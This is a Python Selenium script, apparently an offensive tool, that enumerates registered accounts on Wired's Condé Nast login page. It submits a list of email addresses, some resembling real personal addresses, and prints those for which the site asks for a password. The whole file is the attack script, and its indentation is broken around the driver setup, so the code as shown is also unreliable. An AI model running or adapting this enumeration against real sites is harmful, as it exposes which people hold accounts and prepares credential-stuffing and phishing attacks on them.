# User Enum Wired
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

print("The usernames present in Wired are:")

# Place all the Email IDs to test in the for loop as shown below.
# You can remove all the Email IDs below
for i in ["supeasdasdrman@gmail.com", "priyanka@gmail.com", "batman@gmail.com", "michael@gmail.com", "raghavdevgon@yahoo.com", "superman@gmail.com"]:
#for i in ["batman@gmail.com"]:
    user = i

# Using edge browser
driver = webdriver.Edge(executable_path='msedgedriver')

# Using Firefox browser
#driver = webdriver.FirefoxProfile()
#driver = webdriver.Firefox(driver)

    driver.get("https://id.condenast.com/interaction/o0ovQgqtO4MwtDgRky7R7/email?xid=5f8458c8-66f4-435e-ba7c-423b26b9d3da&scope=openid%20offline_access&state=%7B%22redirectURL%22%3A%22%2F%22%7D&prompt=select_account%20consent&client_id=condenast.identity.1d626eb68f1c4350244000c9fc888e38&redirect_uri=https%3A%2F%2Fwww.wired.com%2Fauth%2Fcomplete&response_type=code")
    p1 = driver.page_source
    sleep(1)
    elem=driver.find_element_by_xpath("//input[@type='email']")
    elem.send_keys(user)
    elem.send_keys(Keys.RETURN)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)

    if "Enter your password to continue." in p2:
        print(i)
    sleep(2)
driver.close()
